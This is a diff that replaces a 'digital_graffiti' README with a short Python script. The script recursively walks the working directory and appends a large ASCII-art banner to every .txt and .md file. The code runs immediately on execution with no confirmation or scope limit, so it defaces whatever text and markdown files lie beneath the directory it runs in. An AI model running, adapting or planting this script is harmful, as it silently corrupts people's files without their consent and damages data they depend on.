@@ -1,7 +1,17 @@
-# digital_graffiti
-self explanatory
+import os
 
+def append_graffiti(graffiti):
+    current_directory = os.getcwd()
 
+    for root, dirs, files in os.walk(current_directory):
+        for file in files:
+            if file.endswith(".txt") or file.endswith(".md"):
+                file_path = os.path.join(root, file)
+                with open(file_path, "a") as file_handle:
+                    file_handle.write("\n" + graffiti)
+
+# Predefined graffiti text to append
+graffiti = """
 MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNXK0kxddolllllllllllodkOKXNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
 MMMMMMMMMMMMMMMMMMMMMMMMMMMMWNK0kdoc:,'..      ............  ....,:ldkOKNWMMMMMMMMMMMMMMMMMMMMMMMMMM
 MMMMMMMMMMMMMMMMMMMMMWNKOxoc,..   ..,;clodxxkOO0KXXXXKKKKK0OOkdoc:,..  ..,:ldk0XWWMMMMMMMMMMMMMMMMMM
@@ -30,3 +40,6 @@ MMMMWO,   :ONMMMWNNNWMMMMMMMMMMWKko;...'cd0WMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN:  cXM
 MMMMMMXx:. .,ldk0KXXXXXKOOkdlc:,...':dONMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN: cXMMMMMMMMMMMMMMMMMMMMMM
 MMMMMMMMWXkl:,...'''',,.....',:ldOKNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWOxXMMMMMMMMMMMMMMMMMMMMMMM
 MMMMMMMMMMMMWNK0kxoodxkxxkOKXNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+"""
+
+append_graffiti(graffiti)
